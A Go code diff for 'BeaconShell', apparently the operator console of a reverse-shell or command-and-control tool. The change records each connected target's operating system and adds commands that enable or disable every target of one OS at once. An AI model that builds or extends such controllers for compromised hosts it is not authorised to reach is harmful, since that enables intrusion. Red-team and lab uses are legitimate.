@@ -12,7 +12,6 @@ import (
 var global_response_timeout int = 1000
 var global_buffer_size int = 4096
 var active_targets int = 0
-var scenario_mode bool = false
 
 // Предоставляет список встроенных команд (вызов: /BS help).
 func BeaconShellHelp() {
@@ -61,9 +60,9 @@ func BeaconShellTargets(targets *[]Target) {
 	BSPrint("Current targets (active: %d, total: %d):\n", active_targets, len(*targets))
 	for i := 0; i < len(*targets); i++ {
 		if (*targets)[i].status == true {
-			fmt.Printf("\t<%d> [+] (%s) %s\n", i, (*targets)[i].group, (*targets)[i].name)
+			fmt.Printf("\t<%d> [+] {%s} (%s) %s\n", i, (*targets)[i].os, (*targets)[i].group, (*targets)[i].name)
 		} else {
-			fmt.Printf("\t<%d> [-] (%s) %s\n", i, (*targets)[i].group, (*targets)[i].name)
+			fmt.Printf("\t<%d> [-] {%s} (%s) %s\n", i, (*targets)[i].os, (*targets)[i].group, (*targets)[i].name)
 		}
 	}
 }
@@ -240,7 +239,7 @@ func BeaconShellRequest(request []string, targets *[]Target, mtx *sync.Mutex) {
 
 		// Если аргументов более трех, остановка
 		if len(request) > 4 {
-			BSPrint("Error! Correct usage: \"/BS off\", \"/BS off <host_id>\" or \"/BS off group <group>\".\n")
+			BSPrint("Error! Correct usage: \"/BS off\", \"/BS off <host_id>\", \"/BS off group <group>\" or \"/BS off os <os>\".\n")
 			return
 		}
 
@@ -262,6 +261,16 @@ func BeaconShellRequest(request []string, targets *[]Target, mtx *sync.Mutex) {
 			return
 		}
 
+		// Если указана конкретная JC, присотановить всех представителей ОС
+		if len(request) == 4 && request[2] == "os" {
+			for i := 0; i < len(*targets); i++ {
+				if (*targets)[i].os == request[3] {
+					BeaconShellOff(targets, i)
+				}
+			}
+			return
+		}
+
 		// Иначе - проверка корректности идентификатора
 		ok, idx := checkTargetNumber(targets, request[2])
 
@@ -275,7 +284,7 @@ func BeaconShellRequest(request []string, targets *[]Target, mtx *sync.Mutex) {
 
 		// Если аргументов более трех, остановка
 		if len(request) > 4 {
-			BSPrint("Error! Correct usage: \"/BS on\", \"/BS on <host_id>\" or \"/BS on group <group>\".\n")
+			BSPrint("Error! Correct usage: \"/BS on\", \"/BS on <host_id>\", \"/BS on group <group>\" or \"/BS on os <os>\".\n")
 			return
 		}
 
@@ -297,6 +306,16 @@ func BeaconShellRequest(request []string, targets *[]Target, mtx *sync.Mutex) {
 			return
 		}
 
+		// Если указана конкретная ОС, возобновить всех представителей ОС
+		if len(request) == 4 && request[2] == "os" {
+			for i := 0; i < len(*targets); i++ {
+				if (*targets)[i].os == request[3] {
+					BeaconShellOn(targets, i)
+				}
+			}
+			return
+		}
+
 		// Иначе - проверка корректности идентификатора
 		ok, idx := checkTargetNumber(targets, request[2])
 
@@ -310,7 +329,7 @@ func BeaconShellRequest(request []string, targets *[]Target, mtx *sync.Mutex) {
 
 		// Если аргументов более трех, остановка
 		if len(request) > 3 {
-			BSPrint("Error! Correct usage: \"/BS remove\", \"/BS remove <host_id>\" or \"/BS remove group <group>\".\n")
+			BSPrint("Error! Correct usage: \"/BS remove\", \"/BS remove <host_id>\", \"/BS remove group <group>\" or \"/BS remove os <os>\".\n")
 			return
 		}
 
@@ -373,7 +392,7 @@ func ReverseShellHandle(targets *[]Target, conn net.Conn, mtx *sync.Mutex) {
 
 	// Добавление хоста в список целей
 	(*mtx).Lock()
-	*targets = append(*targets, Target{name: conn.RemoteAddr().String(), conn: conn, status: false, group: string(init_buf[:n])})
+	*targets = append(*targets, Target{name: conn.RemoteAddr().String(), conn: conn, status: false, os: string(init_buf[:n]), group: "default"})
 	(*mtx).Unlock()
 }
 
